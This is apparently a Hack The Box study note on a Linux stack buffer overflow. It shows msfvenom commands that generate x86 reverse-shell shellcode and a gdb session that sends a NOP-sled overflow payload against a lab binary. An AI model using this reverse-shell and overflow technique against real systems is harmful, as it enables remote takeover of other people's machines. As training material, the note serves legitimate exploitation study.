---
title: "Generate Shellcode"
tags:
  - stack-overflow
  - htb
programming-languagues:
created: 2022-07-12
---
# Generate Shellcode
---
This is part of a guide that you can find [here](notes/htb-stack-based-overflow-linux.md).

We have to pay attention to:

- Architecture
- Platform
- Bad Characters


We can use `msfvenom` to generate our shellcode:

```bash
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

So:

```bash
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
```

Now we have:

```bash
Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
EIP = "\x66" * 4'
```

So we exploit:

```bash
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

We can check if the first bytes of our shellcode matches the bytes after the NOPS:

```bash
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```

